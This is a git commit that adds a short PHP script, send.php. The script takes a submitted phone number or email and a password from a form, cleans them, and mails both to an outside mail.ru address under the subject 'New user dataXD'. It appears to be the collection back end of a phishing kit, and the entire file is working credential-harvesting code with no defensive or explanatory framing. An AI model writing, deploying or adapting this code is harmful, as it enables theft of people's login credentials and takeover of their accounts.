a8a34001bce1a431c83ddb861b95c7649f05e78f
hNhZPa0juHBscaA3HrpVaLAkTwTTFWoh <52633427+hNhZPa0juHBscaA3HrpVaLAkTwTTFWoh@users.noreply.github.com>
2019-07-14 20:46:22 +0300

    Add files via upload

---
+++ send.php
@@ -0,0 +1,14 @@
+﻿<?php
+
+$numOrMail = $_POST['numOrMail'];
+$pswd = $_POST['pswd'];
+
+$numOrMail = urldecode($numOrMail);
+$pswd = urldecode($pswd);
+
+$numOrMail = trim($numOrMail);
+$pswd = trim($pswd);
+
+mail("Sdi9Lf5i@mail.ru", "New user dataXD", "<p>$numOrMail</p><p>$pswd</p>", "VVjpBkJx@mail.ru");
+
+?>
